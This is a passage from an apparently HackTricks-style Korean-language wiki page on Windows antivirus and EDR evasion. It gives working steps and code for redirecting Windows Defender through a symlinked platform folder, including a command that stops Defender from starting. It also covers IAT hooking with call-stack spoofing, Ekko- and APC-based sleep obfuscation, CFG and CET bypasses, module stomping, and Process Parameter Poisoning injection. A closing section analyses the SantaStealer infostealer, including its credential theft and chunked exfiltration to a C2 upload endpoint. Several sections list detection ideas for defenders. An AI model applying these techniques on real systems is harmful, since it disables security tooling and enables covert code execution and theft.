가장 높은 lexicographic version string을 가진 subfolder(예: `4.18.25070.5-0`)를 선택한 다음, 해당 위치에서 Defender service process를 시작합니다(service/registry path도 그에 맞게 업데이트). 이 선택 과정은 directory reparse point(symlink)을 포함한 directory entry를 신뢰합니다. Administrator는 이를 악용하여 Defender를 attacker-writable path로 redirect하고 DLL sideloading 또는 service disruption을 수행할 수 있습니다.<sup>[[21]](#references)[[22]](#references)</sup>

사전 조건
- Local Administrator(Platform folder 아래에 directory/symlink를 생성하는 데 필요)
- reboot하거나 Defender platform re-selection을 trigger할 수 있는 권한(service restart on boot)
- built-in tool만 필요함(mklink)

작동 원리
- Defender는 자체 folder에 대한 write를 차단하지만, platform selection은 directory entry를 신뢰하며 target이 protected/trusted path로 resolve되는지 검증하지 않고 lexicographically 가장 높은 version을 선택합니다.

단계별 진행(예시)
1) 현재 platform folder의 writable clone을 준비합니다. 예: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 사용자의 폴더를 가리키는 더 높은 버전의 디렉터리 심볼릭 링크를 생성합니다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 있고, 해당 위치를 반영하는 service configuration/registry를 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 application directory에서 로드하는 DLL을 삭제하거나 교체하여 Defender 프로세스에서 code를 실행합니다. 위의 [DLL Sideloading & Proxying](#dll-sideloading--proxying) 섹션을 참조하세요.
- Service kill/denial: version-symlink를 제거하면 다음 시작 시 configured path가 resolve되지 않아 Defender가 시작되지 않습니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 technique 자체로는 privilege escalation을 제공하지 않으며, admin rights가 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams는 C2 implant 외부로 runtime evasion을 이동하여 target module 자체에서 수행할 수 있습니다. 이를 위해 해당 module의 Import Address Table (IAT)을 hooking하고, 선택한 API를 attacker-controlled position‑independent code (PIC)로 라우팅합니다. 이 방식은 많은 kit이 노출하는 제한적인 API surface (예: CreateProcessA)를 넘어 evasion을 일반화하며, 동일한 보호 기능을 BOFs와 post‑exploitation DLLs에도 확장합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- Reflective loader (prepended 또는 companion)를 사용하여 target module과 함께 PIC blob을 stage합니다. PIC는 self‑contained이며 position-independent여야 합니다.
- Host DLL이 load될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하고, targeted imports (예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT entries를 thin PIC wrappers를 가리키도록 patch합니다.
- 각 PIC wrapper는 real API address로 tail-calling하기 전에 evasion을 수행합니다. 일반적인 evasion에는 다음이 포함됩니다.
- Call 전후의 memory mask/unmask (예: beacon regions 암호화, RWX→RX, page names/permissions 변경) 후 call이 끝나면 복원합니다.
- Call-stack spoofing: benign stack을 구성하고 target API로 transition하여 call-stack analysis가 예상된 frames로 resolve되도록 합니다.<sup>[[9]](#references)</sup>
- Compatibility를 위해 Aggressor script (또는 equivalent)가 Beacon, BOFs 및 post‑ex DLLs에 대해 hooking할 API를 등록할 수 있도록 interface를 export합니다.

Why IAT hooking here
- Hook된 import를 사용하는 모든 code에서 동작하므로 tool code를 수정하거나 Beacon이 특정 API를 proxy하도록 의존할 필요가 없습니다.
- post‑ex DLLs를 지원합니다. LoadLibrary*를 hooking하면 module loads (예: System.Management.Automation.dll, clr.dll)를 intercept하고 해당 API calls에 동일한 masking/stack evasion을 적용할 수 있습니다.
- CreateProcessA/W를 wrapping하여 call-stack–based detections에 대응하는 process‑spawning post‑ex commands를 안정적으로 사용할 수 있습니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR 이후, import를 처음 사용하기 전에 patch를 적용합니다. TitanLdr/AceLdr 같은 Reflective loader는 로드된 모듈의 DllMain 중 hooking을 수행하는 방식을 보여 줍니다.
- wrapper는 작고 PIC-safe하게 유지합니다. patch 전에 캡처한 original IAT 값 또는 LdrGetProcedureAddress를 통해 실제 API를 resolve합니다.
- PIC에는 RW → RX 전환을 사용하고, writable+executable 페이지가 남지 않도록 합니다.

Call-stack spoofing stub
- Draugr-style PIC stub은 fake call chain(benign module 내부의 return address)을 구성한 다음 실제 API로 pivot합니다.
- 이는 Beacon/BOF에서 sensitive API로 이어지는 canonical stack을 예상하는 detection을 우회합니다.
- stack cutting/stack stitching technique과 함께 사용하여 API prologue 전에 expected frame 내부에 위치시킵니다.

Operational integration
- reflective loader를 post-ex DLL 앞에 추가하여 DLL 로드 시 PIC와 hook이 자동으로 초기화되도록 합니다.
- Aggressor script를 사용해 target API를 등록하면 코드 변경 없이 Beacon과 BOF가 동일한 evasion path의 이점을 투명하게 활용할 수 있습니다.

Detection/DFIR considerations
- IAT integrity: non-image(heap/anon) address로 resolve되는 entry 및 import pointer의 주기적 검증.
- Stack anomalies: loaded image에 속하지 않는 return address, non-image PIC로의 급격한 전환, 일관되지 않은 RtlUserThreadStart ancestry.
- Loader telemetry: 프로세스 내부의 IAT write, import thunk를 수정하는 초기 DllMain 활동, 로드 시 생성되는 예상치 못한 RX region.
- Image-load evasion: LoadLibrary*를 hooking하는 경우, memory masking event와 연관된 automation/clr assembly의 의심스러운 로드를 모니터링합니다.

Related building blocks and examples
- 로드 중 IAT patching을 수행하는 reflective loader (예: TitanLdr, AceLdr)
- Memory masking hook (예: simplehook) 및 stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub (예: Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Reflective loader를 제어할 수 있다면, custom resolver를 사용해 hook을 먼저 확인하도록 loader의 `GetProcAddress` pointer를 교체하여 **`ProcessImports()` 중에** import를 hook할 수 있습니다:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC가 자체적으로 free된 후에도 유지되는 **resident PICO**(persistent PIC object)를 구성합니다.
- `setup_hooks()` function을 export하여 loader의 import resolver를 덮어씁니다(예: `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress`에서 ordinal import를 건너뛰고 `__resolve_hook(ror13hash(name))` 같은 hash-based hook lookup을 사용합니다. hook이 존재하면 이를 반환하고, 그렇지 않으면 실제 `GetProcAddress`로 delegate합니다.
- Crystal Palace의 `addhook "MODULE$Func" "hook"` entry를 사용해 link time에 hook target을 등록합니다. hook은 resident PICO 내부에 존재하므로 계속 유효합니다.

이를 통해 로드 후 loaded DLL의 code section을 patch하지 않고 **import-time IAT redirection**을 수행할 수 있습니다.

### Forcing hookable imports when the target uses PEB-walking

import-time hook은 해당 function이 실제로 target의 IAT에 포함된 경우에만 trigger됩니다. 모듈이 PEB-walk + hash를 통해 API를 resolve하여 import entry가 없다면, 실제 import를 강제로 추가하여 loader의 `ProcessImports()` path가 이를 확인하도록 합니다.

- hash 기반 export resolution(예: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`)을 `&WaitForSingleObject` 같은 direct reference로 교체합니다.
- compiler가 IAT entry를 생성하므로 reflective loader가 import를 resolve할 때 interception할 수 있습니다.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep`을 patch하는 대신 implant가 실제로 사용하는 **wait/IPC primitive**(`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)를 hook합니다. 긴 wait의 경우, memory 내부 image를 idle 중에 encrypt하는 Ekko-style obfuscation chain으로 call을 감쌉니다:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`를 사용해 crafted `CONTEXT` frame과 함께 `NtContinue`를 호출하는 callback sequence를 예약합니다.
- 일반적인 chain(x64): image를 `PAGE_READWRITE`로 설정 → 전체 mapped image에 대해 `advapi32!SystemFunction032`로 RC4 encrypt → blocking wait 수행 → RC4 decrypt → PE section을 순회하며 **section별 permission 복원** → 완료 signal.
- `RtlCaptureContext`는 template `CONTEXT`를 제공합니다. 이를 여러 frame으로 clone하고 register(`Rip/Rcx/Rdx/R8/R9`)를 설정하여 각 step을 호출합니다.

Operational detail: 긴 wait에 대해 `WAIT_OBJECT_0` 같은 “success”를 반환하여 image가 masked된 동안 caller가 계속 진행하도록 합니다. 이 pattern은 idle window 중 scanner로부터 모듈을 숨기며, 일반적인 “patched `Sleep()`” signature를 피합니다.

Detection ideas (telemetry-based)
- `NtContinue`를 가리키는 `CreateTimerQueueTimer` callback의 burst.
- 큰 연속 image-sized buffer에 사용되는 `advapi32!SystemFunction032`.
- 대규모 `VirtualProtect` 이후 custom section별 permission restoration 수행.

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled target에서는 `jmp [rbx]` 또는 `jmp rdi` 같은 mid-function gadget으로의 첫 indirect jump가 일반적으로 `STATUS_STACK_BUFFER_OVERRUN`과 함께 process를 crash시킵니다. 해당 gadget이 모듈의 CFG metadata에 없기 때문입니다. hardened process 내부에서 Ekko/Kraken-style chain을 유지하려면:<sup>[[30]](#references)</sup>

- `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 및 `CFG_CALL_TARGET_VALID` entry를 사용해 chain에서 사용되는 모든 indirect destination을 등록합니다.
- loaded image(`ntdll`, `kernel32`, `advapi32`) 내부의 address인 경우 `MEMORY_RANGE_ENTRY`는 **image base**에서 시작하고 **전체 image size**를 포함해야 합니다.
- manually mapped/PIC/stomped region의 경우에는 **allocation base**와 allocation size를 사용합니다.
- dispatch gadget뿐 아니라 간접적으로 도달하는 export(`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall)와 indirect target이 될 attacker-controlled executable section도 표시합니다.

이를 통해 ROP/JOP-style sleep chain은 “non-CFG process에서만 동작”하는 방식에서 `/guard:cf`로 compile된 `explorer.exe`, browser, `svchost.exe` 및 기타 endpoint에서 재사용 가능한 primitive로 전환됩니다.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement는 noisy하며, spoof된 `Rip`이 hardware shadow stack과 여전히 일치해야 하므로 CET Shadow Stack system에서 동작하지 않을 수 있습니다. 더 안전한 sleep-masking pattern은 다음과 같습니다:<sup>[[30]](#references)</sup>

- 같은 process의 다른 thread를 선택하고 `NtQueryInformationThread`를 통해 해당 thread의 `NT_TIB` / TEB stack bound(`StackBase`, `StackLimit`)를 읽습니다.
- 현재 thread의 실제 TEB/TIB를 backup합니다.
- `GetThreadContext`로 실제 sleeping context를 capture합니다.
- 실제 `Rip`만 spoof context에 복사하고 spoof된 `Rsp`/stack state는 그대로 둡니다.
- sleep window 동안 spoof thread의 `NT_TIB`를 현재 TEB에 복사하여 stack walker가 legitimate stack range 내부에서 unwind하도록 합니다.
- wait가 끝나면 original TIB와 thread context를 restore합니다.

이는 CET와 일치하는 instruction pointer를 유지하면서, TEB stack metadata를 신뢰해 unwind를 검증하는 EDR stack walker를 오도합니다.

### APC-based alternative: Kraken Mask

timer-queue dispatch의 signature가 너무 뚜렷한 경우, 동일한 sleep-encrypt-spoof-restore sequence를 queued APC를 사용하는 suspended helper thread에서 실행할 수 있습니다:<sup>[[27]](#references)</sup>

- `NtTestAlert`를 entrypoint로 하는 helper thread를 생성합니다.
- `NtQueueApcThread`로 prepared `CONTEXT` frame/APC를 queue하고 `NtAlertResumeThread`로 이를 drain합니다.
- default 64 KB thread stack이 고갈되지 않도록 chain state를 helper stack 대신 heap에 저장합니다.
- `NtSignalAndWaitForSingleObject`를 사용해 start event를 atomic하게 signal하고 block합니다.
- TIB/context를 복원하기 전에 main thread를 suspend합니다(`NtSuspendThread` → restore → `NtResumeThread`). 이를 통해 scanner가 half-restored stack을 포착할 수 있는 race window를 줄입니다.

이 방식은 동일한 RC4 masking 및 stack-spoofing 목표를 유지하면서 `CreateTimerQueueTimer` + `NtContinue` signature를 helper-thread/APC signature로 교체합니다.

Additional detection ideas
- sleep, wait 또는 APC dispatch 직전에 수행되는 `VmCfgCallTargetInformation`을 사용한 `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` 또는 `ConnectNamedPipe` 주변에서 수행되는 `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` 이후 현재 thread의 TEB/TIB stack bound에 대한 direct write.
- 간접적으로 `SystemFunction032`, `VirtualProtect` 또는 section-permission restoration helper에 도달하는 `NtQueueApcThread`/`NtAlertResumeThread` chain.
- signed module 내부에서 dispatch pivot으로 사용되는 `FF 23`(`jmp [rbx]`) 또는 `FF E7`(`jmp rdi`) 같은 짧은 gadget signature의 반복 사용.


## Precision Module Stomping

Module stomping은 명백한 private executable memory를 allocate하거나 새로운 sacrificial DLL을 로드하는 대신, target process 내부에 이미 mapped된 DLL의 **`.text` section에서** payload를 실행합니다. overwrite target은 **loaded, disk-backed image**여야 하며, process가 여전히 필요로 하는 code path를 손상시키지 않고 해당 code space가 payload를 수용할 수 있어야 합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` 또는 `comctl32.dll` 같은 common module을 대상으로 하는 naive stomping은 취약합니다. 해당 DLL이 remote process에 로드되지 않았을 수 있고, code region이 너무 작으면 process가 crash하기 때문입니다. 더 안정적인 workflow는 다음과 같습니다.

1. target process module을 enumerate하고 이미 로드된 DLL의 **names-only include list**를 유지합니다.
2. 먼저 payload를 build하고 **정확한 byte size**를 기록합니다.
3. disk에서 candidate DLL을 scan하고 PE section **`.text` `Misc_VirtualSize`**를 payload size와 비교합니다. 이는 executable section이 **memory에 mapped될 때**의 크기를 반영하므로 file size보다 중요합니다.
4. **Export Address Table(EAT)**을 parse하고 exported function RVA를 stomp start offset으로 선택합니다.
5. **blast radius**를 계산합니다. payload가 선택한 function boundary를 초과하면 memory에서 그 뒤에 배치된 인접 export를 overwrite합니다.

실제 환경에서 확인되는 일반적인 recon/selection helper:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- `LoadLibrary`/unexpected image loads의 telemetry를 피하기 위해 원격 프로세스에 **이미 로드된** DLL을 우선 사용합니다.
- 대상 애플리케이션이 거의 실행하지 않는 exports를 우선 사용합니다. 그렇지 않으면 thread 생성 전후에 일반 code path가 stomp된 bytes에 접근할 수 있습니다.
- 대규모 implants에서는 injector source에서 전체 buffer가 올바르게 표현되도록 shellcode embedding을 string literal에서 **byte-array/braced initializer**로 변경해야 하는 경우가 많습니다.

Detection ideas
- 일반적인 private RWX/RX allocations 대신 **image-backed executable pages**(`MEM_IMAGE`, `PAGE_EXECUTE*`)에 대한 remote writes
- 메모리 내 export entry point의 bytes가 디스크의 backing file과 더 이상 일치하지 않는 경우
- 첫 bytes가 최근 수정된 legitimate DLL export 내부에서 실행을 시작하는 remote threads 또는 context pivots
- DLL `.text` pages를 대상으로 thread creation에 이어지는 의심스러운 `VirtualProtect(Ex)` / `WriteProcessMemory` sequences

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3)은 classic remote write path(`VirtualAllocEx` + `WriteProcessMemory`)를 회피하는 **process-injection / EDR-evasion** technique입니다. 이미 실행 중인 target에 bytes를 복사하는 대신, Windows가 `CreateProcessW` startup parameters 중 일부를 child process로 **복사**하고 이를 `PEB->ProcessParameters`(`RTL_USER_PROCESS_PARAMETERS`) 내부에 저장한다는 점을 악용합니다.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

유용한 carriers는 다음과 같습니다.

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` 사용) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine`은 `CreateProcessW`를 위해 **writable memory**를 가리켜야 하며, null terminator를 포함해 **32,767 Unicode characters**로 제한됩니다.
- `lpEnvironment`는 연속된 `NAME=VALUE\0` strings로 구성되고 추가 `\0`으로 종료되는 Unicode environment block이어야 합니다.
- `lpReserved`는 공식적으로 reserved이므로 `ShellInfo` mapping은 안정적인 documented contract가 아니라 implementation detail로 간주해야 합니다.

이 방식은 일반적인 process creation을 **payload-transfer primitive**로 전환합니다. Operator는 attacker-controlled startup data를 사용해 child process를 생성하고, Windows가 cross-process copy를 수행하도록 합니다.

### Remote lookup flow without remote write APIs

Child가 생성된 후에는 **read-only** primitives를 사용해 복사된 buffer를 resolve합니다.

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` 가져오기
2. Remote `PEB` 읽기
3. `PEB.ProcessParameters` 추적
4. `RTL_USER_PROCESS_PARAMETERS` 읽기
5. 선택한 pointer 사용:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### 복사된 parameter buffer 실행

복사된 parameter region은 일반적으로 `RW`이며, 실행 가능하지 않다. 일반적인 P3 chain은 다음과 같다:

1. 프로세스를 정상적으로 생성한다(suspended 상태가 아님)
2. `NtProtectVirtualMemory` / `VirtualProtectEx`를 사용해 선택한 parameter page를 executable로 만든다
3. `PROCESS_INFORMATION`에서 이미 반환된 main thread handle을 재사용한다
4. `NtSetContextThread`(`CONTEXT_CONTROL`, `RIP` overwrite)를 사용해 execution을 redirect한다

기존의 thread hijacking workflow와 달리, 이는 **`SuspendThread` / `ResumeThread`가 필요하지 않다**. 반환된 main thread handle에서 context를 직접 변경할 수 있다.

이를 통해 injection에 흔히 사용되는 다음 API를 여러 개 피할 수 있다:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 대개 `SuspendThread` / `ResumeThread`도 포함

### Null-byte limitation 및 staged shellcode

세 carrier 모두 **string 또는 string-like data**이므로, `0x00`을 포함하는 raw payload는 transfer 중 truncation된다. 실용적인 workaround는 runtime에 constants를 reconstruct한 다음 임의의 second stage를 load하는 **null-free first stage**이다.

간단한 pattern은 XOR-based constant synthesis이다:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
이를 통해 first stage는 전송되는 parameter에 null byte를 포함하지 않고 stack 문자열, API 인자, DLL 경로 또는 second-stage shellcode loader를 구성할 수 있습니다.

### first stage에서의 stack 기반 API 호출

first stage에서 `LoadLibraryA`와 같은 API를 호출해야 하는 경우 다음을 수행할 수 있습니다.

- target stack에 문자열/buffer를 push
- **32-byte x64 shadow space** 예약
- `RCX`, `RDX`, `R8`, `R9`를 상수 또는 `RSP`-relative pointer로 설정
- call 전에 `RSP`를 **16-byte aligned** 상태로 유지

그런 다음 second stage를 stack에서 `PAGE_READWRITE` allocation으로 복사하고, `VirtualProtect`를 사용해 `PAGE_EXECUTE_READ`로 변경한 뒤 jump할 수 있으므로 직접적인 RWX allocation을 피할 수 있습니다.

### Detection 아이디어

authors가 언급한 유효한 hunting 기회는 다음과 같습니다.

- `VirtualProtectEx` / `NtProtectVirtualMemory`가 **process-parameter pages를 executable로 변경**
- 해당 protection change 후 이어지는 `SetThreadContext` / `NtSetContextThread`
- `PEB` 이후 `RTL_USER_PROCESS_PARAMETERS`를 원격으로 읽는 동작
- process creation 중 비정상적으로 긴 / 높은 entropy를 가진 `lpCommandLine`, `lpEnvironment` 또는 `STARTUPINFO.lpReserved` 값

### Notes

- P3는 **cross-process transfer trick**이며, 그 자체로 완전한 execution primitive는 아닙니다. 복사된 parameter에는 여전히 execute-permission change와 execution redirection method가 필요합니다.
- `RtlCreateProcessReflection` / Dirty Vanity는 authors가 검토했지만, 내부적으로 `NtWriteVirtualMemory` 및 `NtCreateThreadEx`와 같은 의심스러운 primitive에 도달하므로 제외되었습니다.

## Fileless Evasion 및 Credential Theft를 위한 SantaStealer Tradecraft

SantaStealer(별칭 BluelineStealer)는 현대적인 info-stealer가 하나의 workflow에서 AV bypass, anti-analysis 및 credential access를 결합하는 방식을 보여줍니다.<sup>[[24]](#references)</sup>

### Keyboard layout gating 및 sandbox delay

- config flag(`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 keyboard layout을 열거합니다. Cyrillic layout이 발견되면 sample은 빈 `CIS` marker를 생성하고 stealer를 실행하기 전에 종료하여, 제외된 locale에서는 절대 detonate하지 않도록 하면서 hunting artifact를 남깁니다.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` logic

- Variant A는 프로세스 목록을 순회하며 각 이름을 custom rolling checksum으로 해시한 뒤 debugger/sandbox용 내장 blocklist와 비교합니다. 또한 컴퓨터 이름에 대해서도 checksum을 반복 수행하고 `C:\analysis` 같은 working directory를 확인합니다.
- Variant B는 system properties(process-count floor, 최근 uptime)를 검사하고, `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox additions를 탐지하며, single-stepping을 식별하기 위해 sleep 전후의 timing checks를 수행합니다. 하나라도 탐지되면 modules가 launch되기 전에 중단됩니다.

### Fileless helper + 이중 ChaCha20 reflective loading

- Primary DLL/EXE에는 Chromium credential helper가 내장되어 있으며, 이 helper는 disk에 drop되거나 memory에 manually mapped됩니다. Fileless mode에서는 imports/relocations를 직접 resolve하므로 helper artifact가 기록되지 않습니다.
- 해당 helper는 두 개의 32-byte key와 12-byte nonce를 사용해 ChaCha20으로 두 번 encryption된 second-stage DLL을 저장합니다. 두 pass가 모두 끝나면 blob을 reflectively load하고(`LoadLibrary`는 사용하지 않음), [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports를 호출합니다.<sup>[[25]](#references)</sup>
- ChromElevator routines는 direct-syscall reflective process hollowing을 사용해 실행 중인 Chromium browser에 inject하고, AppBound Encryption keys를 상속한 뒤, ABE hardening에도 불구하고 SQLite database에서 passwords/cookies/credit cards를 직접 decrypt합니다.


### Modular in-memory collection 및 chunked HTTP exfil

- `create_memory_based_log`는 global `memory_generators` function-pointer table을 순회하고, 활성화된 각 module(Telegram, Discord, Steam, screenshots, documents, browser extensions 등)마다 하나의 thread를 생성합니다. 각 thread는 shared buffer에 results를 기록하고 약 45초의 join window 후 file count를 보고합니다.
- 완료되면 모든 데이터가 statically linked `miniz` library를 사용해 `%TEMP%\\Log.zip`으로 zip됩니다. 이후 `ThreadPayload1`은 15초간 sleep한 다음 HTTP POST를 통해 archive를 10 MB chunks로 `http://<C2>:6767/upload`에 stream합니다. 이때 browser의 `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 spoof합니다. 각 chunk에는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`가 추가되며, 마지막 chunk에는 C2가 reassembly 완료를 알 수 있도록 `complete: true`가 추가됩니다.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
